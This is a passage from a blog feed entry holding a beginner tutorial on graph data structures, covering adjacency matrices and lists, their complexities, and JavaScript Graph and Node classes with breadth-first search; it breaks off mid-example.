    
  </entry>
  
  <entry>
    <title>Graph Data Structures for Beginners</title>
    <link href="https://adrianmejia.com/blog/2018/05/14/Data-Structures-for-Beginners-Graphs-Time-Complexity-tutorial/"/>
    <id>https://adrianmejia.com/blog/2018/05/14/Data-Structures-for-Beginners-Graphs-Time-Complexity-tutorial/</id>
    <published>2018-05-14T09:19:22.000Z</published>
    <updated>2018-05-14T09:19:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>In this post, we are going to explore non-linear data structures like graphs. We are going to cover the central concepts and typical applications.</p>
<p>You are probably using programs that use graphs (and trees). Let‚Äôs say for instance that you want to know the shortest path between your workplace and home you can use graph algorithms to get the answer! We are going to explore this and other fun challenges.</p>
<a id="more"></a>
<p>In the previous post, we explore linear data structures like arrays, linked lists, sets, stacks and so on. This post builds on top of what we learned.</p>
<hr>
<p>This post is part of a tutorial series:</p>
<p><strong>Learning Data Structures and Algorithms (DSA) for Beginners</strong></p>
<ol>
<li><p><a href="/blog/2018/04/04/how-you-can-change-the-world-learning-data-structures-algorithms-free-online-course-tutorial/">Intro to algorithm‚Äôs time complexity and Big O notation</a></p>
<!-- 1. Intro to Algorithm's Time Complexity and Big O Notation **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/04/05/most-popular-algorithms-time-complexity-every-programmer-should-know-free-online-tutorial-course/">Eight time complexities that every programmer should know</a></p>
<!-- 1. Eight time complexities that every programmer should know **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/04/28/Data-Structures-Time-Complexity-for-Beginners-Arrays-HashMaps-Linked-Lists-Stacks-Queues-tutorial/">Data Structures for Beginners: Arrays, HashMaps, and Lists</a></p>
<!-- 1. Data Structures for Beginners: Arrays, HashMaps, and Lists **üëà you are here** -->
</li>
<li><p>Graph Data Structures for Beginners <strong>üëà you are here</strong></p>
<!-- 1. [Graph Data Structures for Beginners](/blog/2018/05/14/Data-Structures-for-Beginners-Graphs-Time-Complexity-tutorial/) -->
</li>
<li><p><a href="/blog/2018/06/11/Data-Structures-for-Beginners-Trees-binary-search-tree-tutorial/">Trees Data Structures for Beginners</a></p>
<!-- 1. Trees Data Structures for Beginners **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/07/16/self-balanced-binary-search-trees-with-avl-tree-data-structure-for-beginners/">Self-balanced Binary Search Trees</a></p>
<!-- 1. Self-balanced Binary Search Trees  **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/04/24/Analysis-of-Recursive-Algorithms/">Appendix I: Analysis of Recursive Algorithms</a></p>
</li>
</ol>
<hr>
<p>Here is the summary of the operations that we are going to cover on this post:</p>
<table>
<thead>
<tr>
<th></th>
<th>Adjacency List</th>
<th>Adjacency Matrix</th>
</tr>
</thead>
<tbody>
<tr>
<td>Space</td>
<td><em><a href="#List.space">O(&#124;V&#124; + &#124;E&#124;)</a></em></td>
<td><em><a href="#Matrix.space">O(&#124;V&#124;<sup>2</sup>)</a></em></td>
</tr>
<tr>
<td><strong>add</strong>Vertex</td>
<td><em><a href="#Graph.addVertex">O(1)</a></em></td>
<td><em><a href="#Matrix.addVertex">O(&#124;V&#124;<sup>2</sup>)</a></em></td>
</tr>
<tr>
<td><strong>remove</strong>Vertex</td>
<td><em><a href="#Graph.removeVertex">O(&#124;V&#124; + &#124;E&#124;)</a></em></td>
<td><em><a href="#Matrix.addVertex">O(&#124;V&#124;<sup>2</sup>)</a></em></td>
</tr>
<tr>
<td><strong>add</strong>Edge</td>
<td><em><a href="#Graph.addEdge">O(1)</a></em></td>
<td><em><a href="#Matrix.addVertex">O(1)</a></em></td>
</tr>
<tr>
<td><strong>remove</strong>Edge (using Array)</td>
<td><em><a href="#Graph.removeEdge">O(&#124;E&#124;)</a></em></td>
<td><em><a href="#Matrix.addVertex">O(1)</a></em></td>
</tr>
<tr>
<td><strong>remove</strong>Edge (using HashSet)</td>
<td><em>O(1)</em></td>
<td><em><a href="#Matrix.addVertex">O(1)</a></em></td>
</tr>
<tr>
<td><strong>get</strong>Adjacents</td>
<td><em><a href="#Node.getAdjacents">O(&#124;E&#124;)</a></em></td>
<td><em><a href="#Matrix.getAdjacents">O(&#124;V&#124;)</a></em></td>
</tr>
<tr>
<td><strong>is</strong>Adjacent (using Array)</td>
<td><em><a href="#Node.getAdjacents">O(&#124;E&#124;)</a></em></td>
<td><em><a href="#Matrix.getAdjacents">O(1)</a></em></td>
</tr>
<tr>
<td><strong>is</strong>Adjacent (using HashSet)</td>
<td><em>O(1)</em></td>
<td><em><a href="#Matrix.getAdjacents">O(1)</a></em></td>
</tr>
</tbody>
</table>
<h1 id="Graphs-Basics">Graphs Basics<a href="#Graphs-Basics" class="headerlink" title="Graphs Basics"></a></h1><!-- http://ccicada.org/wp-content/uploads/2017/06/Community-Detection-with-Hierarchical-Clustering-Algorithms-Feb-3-2017.pdf -->
<p>A graph is a data structure where a <strong>node</strong> can have zero or more adjacent elements.</p>
<p>The connection between two nodes is called <strong>edge</strong>. Nodes can also be called <strong>vertices</strong>.</p>
<img src="/images/graph-parts.jpg" title="Graph is composed of vertices and edges">
<!-- { img http://btechsmartclass.com/DS/images/Graph%201.png Graph is composed of vertices and edges } -->
<p>The <strong>degree</strong> is the number of edges connected to a vertex. E.g., the <code>purple</code> vertex has a degree of 3 while the <code>blue</code> one has a degree of 1.</p>
<p>If the edges are bi-directional, then we have a <strong>undirected graph</strong>. But, if the edges have a direction, then we have a <strong>directed graph</strong> or <strong>di-graph</strong> for short. You can think of it as a one-way street (directed) or two-way street (undirected).</p>
<!-- image of graph behind a map: edges is POI and edges are the streets -->
<!-- { img https://koenig-media.raywenderlich.com/uploads/2017/01/graph6.png "Directed and Undirected graphs" } -->
<img src="/images/directed-vs-undirected-graph.jpg" title="Directed vs Undirected graph">
<p>Vertex can have edges that go to itself (e.g., <code>blue</code> node), this is called <strong>self-loop</strong>.</p>
<p>A graph can have <strong>cycles</strong> which means that if you traverse through the node, you could get to the same node more than once. The graph without cycles is called <strong>acyclic graph</strong>.</p>
<!-- { img http://apprize.info/php/hadoop_1/hadoop_1.files/image190.jpg Acyclic vs Cyclic Graphs } -->
<img src="/images/cyclic-vs-acyclic-directed-graph.jpg" title="Cyclic vs Acyclic directed graph">
<p>Also, acyclic undirected graphs are called <strong>tree</strong>. We are going to cover trees in depth in the next post.</p>
<p>Not all vertices have to be connected in the graph. You might have isolated nodes or even separated subgraphs. If all nodes are has a least one edge, then we have a <strong>connected graph</strong>. When all nodes are connected to all other nodes, then we have a <strong>complete graph</strong>.</p>
<!-- { img /images/digraph-subgraph.png digraph with isolated subgraphs } -->
<img src="/images/connected-vs-complete-graph.jpg" title="Complete vs Connected graph">
<p>For a complete graph, each node has to have <code>#nodes - 1</code> edges. In the previous example we have 7 vertices, so each node has 6 edges.</p>
<h1 id="Graph-Applications">Graph Applications<a href="#Graph-Applications" class="headerlink" title="Graph Applications"></a></h1><p>When edges have values/cost assigned to them, we say we have a <strong>weighted graph</strong>. If the weight is absent, we can assume it‚Äôs 1.</p>
<img src="/images/airports-weighted-graph.jpg" title="Airports weighted graph">
<p>Weighted graphs have many applications depending on the domain where you need to solve a problem. To name a few:</p>
<ul>
<li><p>Airline Traffic (image above)</p>
<ul>
<li>Node/vertex = Airport</li>
<li>Edges = direct flights between two airports</li>
<li>Weight = miles between two airports</li>
</ul>
</li>
<li><p>GPS Navigation</p>
<ul>
<li>Node = road insersection</li>
<li>Edge = road</li>
<li>Weigth = time required to go from one intersection to another</li>
</ul>
</li>
<li><p>Networks routing</p>
<ul>
<li>Node = server</li>
<li>Edge = data link</li>
<li>Weight = connection speed</li>
</ul>
</li>
</ul>
<p>In general, graphs have many real-world applications like:</p>
<ul>
<li>Electronic circuits</li>
<li>Flight reservations</li>
<li>Driving directions</li>
<li>Telcom: Cell tower frequency planning</li>
<li>Social networks. E.g., Facebook uses a graph for suggesting friends</li>
<li>Recommendations: Amazon/Netflix uses graphs to make suggestions products/movies</li>
<li>Graphs help to plan logistics of delivering goods</li>
</ul>
<img src="/images/map-graph.jpg" title="Graph applications: path finder">
<p>We just learned the basics of graphs and some applications. Let‚Äôs learn now how to represent graphs in code.</p>
<h1 id="Representing-graphs">Representing graphs<a href="#Representing-graphs" class="headerlink" title="Representing graphs"></a></h1><p>Thre are two primary ways of representing graph:</p>
<ol>
<li>Adjacency list</li>
<li>Adjacency Matrix</li>
</ol>
<p>Let‚Äôs explain it with the following directed graph (digraph) as an example:</p>
<img src="/images/digraph.png" title="digraph">
<p>We a digraph with 4 nodes. When a vertex has link to itself (e.g. <code>a</code>) is called <strong>self-loop</strong>.
<!-- Notice that `a` has **self-loop**. -->
<!-- img https://www.ida.liu.se/opendsa/OpenDSA/Books/TDDD86_2014/html/_images/GraphRep.png Graph representation: Adjacency list and matrix  --></p>
<h2 id="Adjacency-Matrix">Adjacency Matrix<a href="#Adjacency-Matrix" class="headerlink" title="Adjacency Matrix"></a></h2><p>The adjacency matrix is one way of representing a graph using a two-dimensional array (NxN matrix). In the intersection of nodes, we add 1 (or other weight) if they are connected and <code>0</code> or <code>-</code> if they are not connected.</p>
<p>Using the same example as before, we can build the following adjacency matrix:</p>
<figure class="highlight plain"><figcaption><span>Adjacency Matrix</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  a b c d e</span><br><span class="line">a 1 1 - - -</span><br><span class="line">b - - 1 - -</span><br><span class="line">c - - - 1 -</span><br><span class="line">d - 1 1 - -</span><br></pre></td></tr></table></figure>
<p>As you can see, the matrix list all nodes horizontally and vertically. If there a few connections we called <strong>sparse graph</strong> if there are many connections (close to the max number of links) we called it <strong>dense graph</strong>. If all possible connections are reached, then we have a <strong>complete graph</strong>.</p>
<p>It‚Äôs important to notice that for undirected graphs the adjacency matrix will <strong>always</strong> be symmetrical by the diagonal. However, that‚Äôs not always the case on a digraph (like our example).</p>
<p>What is the time complexity of finding connections of two vertices?</p>
<blockquote>
<p>Querying if two nodes are connected in an adjacency matrix is <em>O(1)</em>.</p>
</blockquote>
<p><a id="Matrix.space"></a></p>
<p>What is the space complexity?</p>
<blockquote>
<p>Storing a graph as an adjacency matrix has a space complexity of <em>O(n<sup>2</sup>)</em>, where <code>n</code> is the number of vertices. Also, represented as <em>O(|V|<sup>2</sup>)</em></p>
</blockquote>
<p><a id="Matrix.addVertex"></a></p>
<p>What is the runtime to add a vertex?</p>
<p>The vertices are stored as a <em><code>V</code></em>x<em><code>V</code></em> matrix. So, everytime a vertex is added, the matrix needs to be reconstructed to a <em><code>V+1</code></em>x<em><code>V+1</code></em>.</p>
<blockquote>
<p>Adding a vertex on a adjacency matrix is <em>O(|V|<sup>2</sup>)</em></p>
</blockquote>
<p><a id="Matrix.getAdjacents"></a></p>
<p>What about getting the adjacent nodes?</p>
<p>Since the matrix has a VxV matrix, to get all the adjacent nodes to a given vertex, we would have to go to the node row and get all its edges with the other nodes.</p>
<p>In our previous example, let‚Äôs say we want all the adjacent nodes to <code>b</code>. We have to get the full row where b with all the other nodes.
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  a b c d e</span><br><span class="line">b - - 1 - -</span><br></pre></td></tr></table></figure></p>
<p>We have to visit all nodes so,</p>
<blockquote>
<p>Getting adjacent nodes on an adjacency matrix is <em>O(|V|)</em></p>
</blockquote>
<p>Imagine that you need to represent Facebook network as a graph. You would have to create a matrix of 2 billion x 2 billion, where most of it would be empty! Nobody would know everybody else just a few thousands at most.</p>
<p>In general, we deal with sparse graphs so the matrix will waste a lot of space. That‚Äôs why in most implementation we would use an adjacency list rather than the matrix.</p>
<h2 id="Adjacency-List">Adjacency List<a href="#Adjacency-List" class="headerlink" title="Adjacency List"></a></h2><p>Adjacency List is one of the most common ways to represent graphs. Each node has a list of all the nodes connected to it.</p>
<p>Graphs can be represented as an adjacency list using an Array (or HashMap) containing the nodes. Each of this node entries includes a list (array, linked list, set, etc.) that list its adjacent nodes.</p>
<p>For instance in the graph above we have that <code>a</code> has an connection to <code>b</code> and also a self-loop to itself. In turn, <code>b</code> has a connection to <code>c</code> and so on:</p>
<figure class="highlight plain"><figcaption><span>Adjacency List</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a -&gt; &#123; a b &#125;</span><br><span class="line">b -&gt; &#123; c &#125;</span><br><span class="line">c -&gt; &#123; d &#125;</span><br><span class="line">d -&gt; &#123; b c &#125;</span><br></pre></td></tr></table></figure>
<p>As you can imagine if you want to know if a node is connected to another node, you would have to go through the list.</p>
<blockquote>
<p>Querying if two nodes are connected in an adjacency list is <em>O(n)</em>, where <code>n</code> is the number of vertices. Also represented as <em>O(|V|)</em></p>
</blockquote>
<p><a id="List.space"></a></p>
<p>What about the space complexity?</p>
<blockquote>
<p>Storing a graph as an adjacency list has a space complexity of <em>O(n)</em>, where <code>n</code> is the sum of vertices and edges. Also, represented as <em>O(|V| + |E|)</em></p>
</blockquote>
<h1 id="Adjacency-List-Graph-HashMap-Implementation">Adjacency List Graph HashMap Implementation<a href="#Adjacency-List-Graph-HashMap-Implementation" class="headerlink" title="Adjacency List Graph HashMap Implementation"></a></h1><p>The adjacency list is the most common way of representing graphs. There are several ways to implement the adjacency list:</p>
<p>One of the most simple is using a HashMap. The <code>key</code> is the value of the node, and the <code>value</code> is an array of adjacency.</p>
<figure class="highlight js"><figcaption><span>Adjacency List as a Hashmap</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> graph = &#123;</span><br><span class="line">  a: [<span class="string">'a'</span>, <span class="string">'b'</span>],</span><br><span class="line">  b: [<span class="string">'c'</span>],</span><br><span class="line">  c: [<span class="string">'d'</span>],</span><br><span class="line">  d: [<span class="string">'b'</span>, <span class="string">'c'</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Graph usually needs the following operations:</p>
<ul>
<li>Add and remove vertices</li>
<li>Add and remove edges</li>
</ul>
<p>Adding and removing vertices involves updating the adjacency list.</p>
<p>Let‚Äôs say that we want to remove the vertex <code>b</code>. We could do <code>delete graph[&#39;b&#39;];</code>, however, we still have to remove the references on the adjacency list on <code>d</code> and <code>a</code>.</p>
<p>Everytime we remove a node, we would have to iterate through all the nodes‚Äô list <em>O(|V| + |E|)</em>.  Can do better? We will answer that later, first let‚Äôs *implement our list in a more object-oriented way so we can swap implementations easily.</p>
<h1 id="Adjacency-List-Graph-OO-Implementation">Adjacency List Graph OO Implementation<a href="#Adjacency-List-Graph-OO-Implementation" class="headerlink" title="Adjacency List Graph OO Implementation"></a></h1><p>Let‚Äôs start with the <code>Node</code> class that holds the vertex‚Äôs value and its adjacent vertices. We can also have helper functions for adding and removing adjacent nodes from the list.</p>
<p><a id="Node.getAdjacents"></a></p>
<figure class="highlight js"><figcaption><span>Node</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/graphs/node.js" target="_blank" rel="noopener">Commented Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(value) &#123;</span><br><span class="line">    <span class="keyword">this</span>.value = value;</span><br><span class="line">    <span class="keyword">this</span>.adjacents = []; <span class="comment">// adjacency list</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  addAdjacent(node) &#123;</span><br><span class="line marked">    <span class="keyword">this</span>.adjacents.push(node);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  removeAdjacent(node) &#123;</span><br><span class="line">    <span class="keyword">const</span> index = <span class="keyword">this</span>.adjacents.indexOf(node);</span><br><span class="line">    <span class="keyword">if</span>(index &gt; <span class="number">-1</span>) &#123;</span><br><span class="line marked">      <span class="keyword">this</span>.adjacents.splice(index, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  getAdjacents() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.adjacents;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  isAdjacent(node) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.adjacents.indexOf(node) &gt; <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Notice that <code>adjacent</code> runtime is <em>O(1)</em>, while <code>remove adjacent</code> is <em>O(|E|)</em>. What if instead of an array use a HashSet üßê? It could be <em>O(1)</em>. But, let first get it working and later we can make it faster.</p>
<blockquote>
<p>Make it work. Make it right. Make it faster.</p>
</blockquote>
<p>Ok, now that we have the <code>Node</code> class, let‚Äôs build the Graph class that can perform operations such as adding/removing vertices and edges.</p>
<p><strong>Graph.constructor</strong></p>
<figure class="highlight js"><figcaption><span>Graph.constructor</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/graphs/graph.js" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Graph</span> </span>&#123;</span><br><span class="line marked">  <span class="keyword">constructor</span>(edgeDirection = Graph.DIRECTED) &#123;</span><br><span class="line">    <span class="keyword">this</span>.nodes = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line marked">    <span class="keyword">this</span>.edgeDirection = edgeDirection;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line marked">Graph.UNDIRECTED = <span class="built_in">Symbol</span>(<span class="string">'directed graph'</span>); <span class="comment">// one-way edges</span></span><br><span class="line marked">Graph.DIRECTED = <span class="built_in">Symbol</span>(<span class="string">'undirected graph'</span>); <span class="comment">// two-ways edges</span></span><br></pre></td></tr></table></figure>
<p>The first thing that we need to know is if the graph is directed or undirected. That makes a difference when we are adding edges.</p>
<p><a id="Graph.addEdge"></a></p>
<p><strong>Graph.addEdge</strong></p>
<p>Two add an edge we need two nodes. One is the source, and the other is the destination.</p>
<figure class="highlight js"><figcaption><span>Graph.addEdge</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/graphs/graph.js" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">addEdge(source, destination) &#123;</span><br><span class="line">  <span class="keyword">const</span> sourceNode = <span class="keyword">this</span>.addVertex(source);</span><br><span class="line">  <span class="keyword">const</span> destinationNode = <span class="keyword">this</span>.addVertex(destination);</span><br><span class="line"></span><br><span class="line">  sourceNode.addAdjacent(destinationNode);</span><br><span class="line"></span><br><span class="line marked">  <span class="keyword">if</span>(<span class="keyword">this</span>.edgeDirection === Graph.UNDIRECTED) &#123;</span><br><span class="line">    destinationNode.addAdjacent(sourceNode);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> [sourceNode, destinationNode];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We add an edge from the source vertex to the destination. If we have an undirected graph, then we also add from target node to source since it‚Äôs bidirectional.</p>
<blockquote>
<p>The runtime of adding an edge from a graph adjacency list is: <em>O(1)</em></p>
</blockquote>
<p>If we try to add an edge and the nodes don‚Äôt exist, we need to create them first. Let‚Äôs do that next!</p>
<p><a id="Graph.addVertex"></a></p>
<p><strong>Graph.addVertex</strong></p>
<!-- If you take a look at the constructor, you will notice that we created a HashMap to hold all the nodes in the graph. We use the hashMap to know if the vertex already exists and get it quickly. -->
<p>The way we create a node is that we add it to the <code>this.nodes</code> Map. The map store a key/value pair, where the <code>key</code> is the vertex‚Äôs value while the map <code>value</code> is the instance of the node class. Take a look at line 5-6:</p>
<figure class="highlight js"><figcaption><span>Graph.addVertex</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/graphs/graph.js" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">addVertex(value) &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">this</span>.nodes.has(value)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.nodes.get(value);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line marked">    <span class="keyword">const</span> vertex = <span class="keyword">new</span> Node(value);</span><br><span class="line marked">    <span class="keyword">this</span>.nodes.set(value, vertex);</span><br><span class="line">    <span class="keyword">return</span> vertex;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If the node already exists we don‚Äôt want to overwrite it. So, we first check if it already exists if not then we create it.</p>
<blockquote>
<p>The runtime of adding a vertex from a graph adjacency list is: <em>O(1)</em></p>
</blockquote>
<p><a id="Graph.removeVertex"></a></p>
<p><strong>Graph.removeVertex</strong></p>
<p>Removing a node from the graph, it‚Äôs a little bit more involved. We have to check if the node to be deleted it‚Äôs in use as an adjacent node.</p>
<figure class="highlight js"><figcaption><span>Graph.removeVertex</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/graphs/graph.js" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">removeVertex(value) &#123;</span><br><span class="line">  <span class="keyword">const</span> current = <span class="keyword">this</span>.nodes.get(value);</span><br><span class="line">  <span class="keyword">if</span>(current) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> node <span class="keyword">of</span> <span class="keyword">this</span>.nodes.values()) &#123;</span><br><span class="line marked">      node.removeAdjacent(current);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line marked">  <span class="keyword">return</span> <span class="keyword">this</span>.nodes.delete(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We have to through each vertex and then each adjacent node (edges).</p>
<blockquote>
<p>The runtime of removing a vertex from a graph adjacency list is: <em>O(|V| + |E|)</em></p>
</blockquote>
<p>Finally, let‚Äôs remove implement removing an edge!</p>
<p><a id="Graph.removeEdge"></a></p>
<p><strong>Graph.removeEdge</strong></p>
<p>Removing an edge is pretty straightforward and similar to <code>addEdge</code>.</p>
<figure class="highlight js"><figcaption><span>Graph.removeVertex</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/graphs/graph.js" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">removeEdge(source, destination) &#123;</span><br><span class="line">  <span class="keyword">const</span> sourceNode = <span class="keyword">this</span>.nodes.get(source);</span><br><span class="line">  <span class="keyword">const</span> destinationNode = <span class="keyword">this</span>.nodes.get(destination);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(sourceNode &amp;&amp; destinationNode) &#123;</span><br><span class="line marked">    sourceNode.removeAdjacent(destinationNode);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.edgeDirection === Graph.UNDIRECTED) &#123;</span><br><span class="line marked">      destinationNode.removeAdjacent(sourceNode);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> [sourceNode, destinationNode];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The main difference between <code>addEdge</code> and <code>removeEdge</code> is that:</p>
<ul>
<li>If the vertices don‚Äôt exist, we won‚Äôt create them.</li>
<li>We use <code>Node.removeAdjacent</code> instead of <code>Node.addAdjacent</code>.</li>
</ul>
<p>Since <code>removeAdjacent</code> has to go through all the adjacent vertices we have the following runtime:</p>
<blockquote>
<p>The runtime of removing an edge from a graph adjacency list is <em>O(|E|)</em></p>
</blockquote>
<p>We are going to explore how to search values from a node.</p>
<h1 id="Breadth-frirst-search-BFS-Graph-search">Breadth-frirst search (BFS) - Graph search<a href="#Breadth-frirst-search-BFS-Graph-search" class="headerlink" title="Breadth-frirst search (BFS) - Graph search"></a></h1><p>Breadth-first search is a way to navigate a graph from an initial vertex by visiting all the adjacent nodes first.</p>
<img src="https://upload.wikimedia.org/wikipedia/commons/5/5d/Breadth-First-Search-Algorithm.gif" title="Breadth First Search in a graph">
<p>Let‚Äôs see how we can accomplish this in code:</p>
<figure class="highlight js"><figcaption><span>Graph.bfs</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/graphs/graph.js" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*bfs(first) &#123;</span><br><span class="line">  <span class="keyword">const</span> visited = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line marked">  <span class="keyword">const</span> visitList = <span class="keyword">new</span> Queue();</span><br><span class="line"></span><br><span class="line">  visitList.add(first);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(!visitList.isEmpty()) &#123;</span><br><span class="line">    <span class="keyword">const</span> node = visitList.remove();</span><br><span class="line">    <span class="keyword">if</span>(node &amp;&amp; !visited.has(node)) &#123;</span><br><span class="line">      <span class="keyword">yield</span> node;</span><br><span class="line">      visited.set(node);</span><br><span class="line">      node.getAdjacents().forEach(<span class="function"><span class="params">adj</span> =&gt;</span> visitList.add(adj));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>As you can see we are using a <code>Queue</code> where the first node in, is also the first node to be visited (FIFO).</p>
<p>We are also using <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Generator" target="_blank" rel="noopener">JavaScript generators</a>, notice the <code>*</code> in front of the function. We are using a generator to iterate one value at a time. That‚Äôs useful for large graphs (millions of nodes) because in most cases you don‚Äôt need to visit every single node.</p>
<p>This an example of how to use the BFS that we just created:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> graph = <span class="keyword">new</span> Graph(Graph.UNDIRECTED);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [first] = graph.addEdge(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">graph.addEdge(<span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">graph.addEdge(<span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">graph.addEdge(<span class="number">5</span>, <span class="number">2</span>);</span><br><span class="line">graph.addEdge(<span class="number">6</span>, <span class="number">3</span>);</span><br><span class="line">graph.addEdge(<span class="number">7</span>, <span class="number">3</span>);</span><br><span class="line">graph.addEdge(<span class="number">8</span>, <span class="number">4</span>);</span><br><span class="line">graph.addEdge(<span class="number">9</span>, <span class="number">5</span>);</span><br><span class="line">graph.addEdge(<span class="number">10</span>, 